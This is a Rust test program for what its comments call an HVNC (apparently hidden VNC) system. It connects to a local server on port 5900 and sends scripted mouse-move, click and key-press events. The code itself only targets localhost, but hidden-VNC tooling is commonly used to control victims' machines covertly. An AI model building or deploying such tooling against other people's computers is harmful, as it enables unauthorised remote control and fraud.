//! Comprehensive input test for HVNC system
//! This test verifies the end-to-end input functionality

use hidden_vnc::{common::InputEvent, common::MouseButton};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use std::time::Duration;
use log::{info, error, debug};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    info!(\"🧪 HVNC Input Test Starting...\");
    
    // Connect to server
    let mut stream = TcpStream::connect(\"127.0.0.1:5900\").await?;
    info!(\"✅ Connected to HVNC server\");
    
    // Test events
    let test_events = vec![
        InputEvent::MouseMove { x: 100, y: 100 },
        InputEvent::MouseClick { x: 100, y: 100, button: MouseButton::Left },
        InputEvent::KeyPress { keycode: 65, pressed: true },  // A key down
        InputEvent::KeyPress { keycode: 65, pressed: false }, // A key up
    ];
    
    for (i, event) in test_events.iter().enumerate() {
        info!(\"🚀 Sending test event {}: {:?}\", i + 1, event);
        
        // Serialize and send
        let data = serde_json::to_vec(event)?;
        let len = data.len() as u32;
        
        stream.write_all(&len.to_le_bytes()).await?;
        stream.write_all(&data).await?;
        stream.flush().await?;
        
        info!(\"✅ Event {} sent successfully\", i + 1);
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    
    // Keep connection alive
    tokio::time::sleep(Duration::from_secs(5)).await;
    info!(\"🏁 Input test completed\");
    
    Ok(())
}